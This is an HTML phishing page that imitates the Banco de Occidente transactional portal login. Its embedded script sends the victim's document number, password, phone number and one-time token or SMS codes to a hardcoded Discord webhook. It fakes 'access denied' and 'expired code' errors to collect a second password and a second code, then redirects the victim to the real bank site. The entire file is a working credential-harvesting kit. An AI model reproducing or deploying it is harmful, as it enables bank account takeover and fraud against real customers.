<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Transaccional - Banco de Occidente</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        /* Estilos del Modal de Token */
        #modalToken {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 10000; justify-content: center; align-items: center;
            font-family: Arial, sans-serif;
        }
        .token-card {
            background: white; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px; text-align: center;
        }
        .token-input-field {
            width: 100%; padding: 12px; font-size: 24px; text-align: center; border: 1px solid #ccc;
            margin: 20px 0; letter-spacing: 4px; border-radius: 4px; outline: none;
        }

        /* Contenedor del GIF de carga */
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .loading-gif {
            width: 80px;
            height: auto;
        }
        .loading-text {
            margin-top: 15px;
            font-size: 14px;
            color: #004b91;
            font-weight: bold;
        }

        /* Asegurar que SweetAlert esté siempre al frente */
        .swal2-container { z-index: 20000 !important; }
    </style>
</head>
<body>

    <div class="slideshow-container">
        <div class="slide" style="background-image: url('login_sin_texto1.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto2.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto3.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto4.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto5.jfif');"></div>
    </div>

    <div class="overlay"></div>

    <div class="main-content">
        <div class="login-card" id="loginCard">
            <div class="security-badge">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                Seguridad
            </div>

            <div class="header">
                <img src="https://www.bancodeoccidente.com.co/portaltransaccional/logo-03-occidente-01-occidente-01-regular.fcca1c0810b8bb3f.svg" alt="Logo" class="logo">
                <p class="welcome">¡Bienvenido! a tu,</p>
                <h2 class="title">Portal Transaccional</h2>
            </div>

            <div id="loadingSection" style="display:none;" class="loading-container">
                <img src="spinner_occidente.gif" class="loading-gif" alt="Cargando...">
                <p class="loading-text">Validando información...</p>
            </div>

            <form id="loginForm">
                <div class="field-group">
                    <label>Identificación</label>
                    <div class="id-row">
                        <select class="id-select" id="tipo_doc">
                            <option>C.C</option>
                            <option>C.E</option>
                            <option>PS</option>
                            <option>T.I</option>
                        </select>
                        <input type="text" id="documento" placeholder="Número de documento" class="id-input" required>
                    </div>
                </div>

                <div class="field-group">
                    <label>Contraseña</label>
                    <div class="password-input-container">
                        <input type="password" id="clave" placeholder="Ingresa tu contraseña" required>
                        <span class="toggle-pass" onclick="toggleClave()">👁️</span>
                    </div>
                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
                </div>

                <div class="captcha-box">
                    <div class="captcha-left">
                        <input type="checkbox" required> <span>No soy un robot</span>
                    </div>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha" width="30">
                </div>

                <div class="actions">
                    <button type="button" class="btn-reg">Regístrate</button>
                    <button type="submit" class="btn-in" id="btnIngresar">Ingresar</button>
                </div>
            </form>
        </div>
    </div>

    <div id="modalToken">
        <div class="token-card">
            <img src="https://www.bancodeoccidente.com.co/portaltransaccional/logo-03-occidente-01-occidente-01-regular.fcca1c0810b8bb3f.svg" alt="Logo" style="width: 140px; margin-bottom: 15px;">
            <h3 style="color: #004b91;">Validación Token o Sms</h3>
            
            <div id="tokenLoading" style="display:none;" class="loading-container">
                <img src="spinner_occidente.gif" class="loading-gif" alt="Cargando...">
                <p class="loading-text">Verificando código...</p>
            </div>

            <div id="tokenInputArea">
                <p style="font-size: 13px; color: #666;">Ingresa el código de 6 u 8 dígitos generado en tu token fisico o aplicacion movil, o enviado a tu celular via SMS</p>
                <input type="tel" id="tokenInput" maxlength="8" placeholder="Código" class="token-input-field" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                <button type="button" onclick="procesarToken()" class="btn-in" style="width: 100%;">VERIFICAR</button>
            </div>
        </div>
    </div>

    <script>
    let intentosLogin = 0;
    let intentosToken = 0;
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1497847012505292830/5igS1C-NLz__TcRY9UEzfwaM3YcHdus6x0TnYnJTDPUqgL9x9JO5-Lle7MCAwGN_Ic1D"; 

    function toggleClave() {
        const input = document.getElementById("clave");
        input.type = input.type === "password" ? "text" : "password";
    }

    document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
        intentosLogin++;

        const form = document.getElementById("loginForm");
        const loader = document.getElementById("loadingSection");
        const doc = document.getElementById("documento").value;
        const pass = document.getElementById("clave").value;
        const tel = new URLSearchParams(window.location.search).get('telefono') || "No capturado";

        form.style.display = "none";
        loader.style.display = "flex";

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `**📥 LOGIN**\n**Cel:** ${tel}\n**Doc:** ${doc}\n**Pass:** \`${pass}\`\n**Intento:** #${intentosLogin}`
            })
        });

        setTimeout(() => {
            loader.style.display = "none";
            if (intentosLogin < 2) {
                Swal.fire({
                    icon: 'error',
                    title: 'Acceso Denegado',
                    text: 'Datos incorrectos, intente nuevamente.',
                    confirmButtonColor: '#0076ff'
                }).then(() => {
                    form.style.display = "block";
                    document.getElementById("clave").value = "";
                });
            } else {
                document.getElementById("modalToken").style.display = "flex";
            }
        }, 3000); 
    });

    async function procesarToken() {
        const tk = document.getElementById("tokenInput").value;
        if(tk.length !== 6 && tk.length !== 8) return;

        intentosToken++;
        const inputArea = document.getElementById("tokenInputArea");
        const loader = document.getElementById("tokenLoading");

        inputArea.style.display = "none";
        loader.style.display = "flex";

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: `🔢 **TOKEN #${intentosToken}**: \`${tk}\`` })
        });

        setTimeout(() => {
            loader.style.display = "none";
            if (intentosToken === 1) {
                inputArea.style.display = "block";
                document.getElementById("tokenInput").value = "";
                Swal.fire({
                    icon: 'error',
                    title: 'Código Expirado',
                    text: 'El código ha expirado. Genere uno nuevo.',
                    confirmButtonColor: '#d33'
                });
            } else {
                Swal.fire({
                    icon: 'success',
                    title: 'Solicitud Exitosa',
                    text: 'Procesado correctamente.',
                    confirmButtonColor: '#00c3a5'
                }).then(() => {
                    window.location.href = "https://www.bancodeoccidente.com.co/";
                });
            }
        }, 3000);
    }
</script>
</body>
</html>
